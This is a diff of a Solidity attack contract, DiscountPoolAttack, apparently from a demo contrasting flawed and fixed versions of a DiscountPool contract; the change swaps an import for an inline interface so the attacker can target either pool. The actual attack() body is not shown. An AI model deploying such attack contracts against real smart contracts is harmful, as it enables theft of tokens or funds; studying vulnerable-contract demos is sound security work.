@@ -1,9 +1,17 @@
 pragma solidity ^0.4.4;
-import "./DiscountPoolFlawed.sol";
+
+// To be agnostic of fixed or flawed pool let's just put the interface here
+contract DiscountPool {
+    mapping (address => uint) public tokens;
+    function getMoney(){}
+    function sendToken(address receiver, uint amount){}
+}
+
+
 
 contract DiscountPoolAttack {
 
-    DiscountPoolFlawed discountPool;
+    DiscountPool discountPool;
     address owner;
 
     modifier only_owner { if (msg.sender != owner) {
@@ -14,7 +22,7 @@ contract DiscountPoolAttack {
 
     function DiscountPoolAttack(address discountPoolAddress) {
         owner = msg.sender;
-        discountPool = DiscountPoolFlawed(discountPoolAddress);
+        discountPool = DiscountPool(discountPoolAddress);
     }
 
     function attack() only_owner {
